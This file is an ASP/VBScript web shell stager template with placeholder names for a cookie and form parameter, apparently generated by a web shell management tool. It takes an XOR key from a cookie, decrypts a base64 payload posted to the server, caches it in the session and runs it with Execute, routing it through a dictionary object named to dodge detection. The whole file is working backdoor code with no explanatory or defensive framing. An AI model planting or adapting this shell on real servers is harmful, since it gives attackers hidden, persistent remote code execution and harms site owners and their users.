<%
Set bypassDictionary = Server.CreateObject("Scripting.Dictionary")

Function Base64Decode(ByVal vCode)
    Dim oXML, oNode
    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.text = vCode
    Base64Decode = oNode.nodeTypedValue
    Set oNode = Nothing
    Set oXML = Nothing
End Function

Function decryption(content,isBin)
    dim size,i,result,keySize
    keySize = len(key)
    Set BinaryStream = CreateObject("ADODB.Stream")
    BinaryStream.CharSet = "iso-8859-1"
    BinaryStream.Type = 2
    BinaryStream.Open
    if IsArray(content) then
        size=UBound(content)+1
        For i=1 To size
            BinaryStream.WriteText chrw(ascb(midb(content,i,1)) Xor Asc(Mid(key,(i mod keySize)+1,1)))
        Next
    end if
    BinaryStream.Position = 0
    if isBin then
        BinaryStream.Type = 1
        decryption=BinaryStream.Read()
    else
        decryption=BinaryStream.ReadText()
    end if

End Function
    Dim cookieName, cookieValue, stagerKey
    cookieName = "$cookie_name$"
    cookieValue = ""
    If Not IsEmpty(Request.Cookies(cookieName)) Then
        cookieValue = Request.Cookies(cookieName)
    End If
    stagerKey = cookieValue
    If Len(stagerKey) > 16 Then
        stagerKey = Left(stagerKey, 16)
    End If

    if IsEmpty(cookieValue) then
        response.End
    end if
    if  IsEmpty(Session("payload")) then
        content=request.Form("$param$")
        if IsEmpty(content) then
            response.End
        end if
        key = stagerKey
        content=decryption(Base64Decode(content),false)
        Session("payload")=content
        response.End
    else
        bypassDictionary.Add "payload",Session("payload")
        Execute(bypassDictionary("payload"))
        response.End
    end if
%>
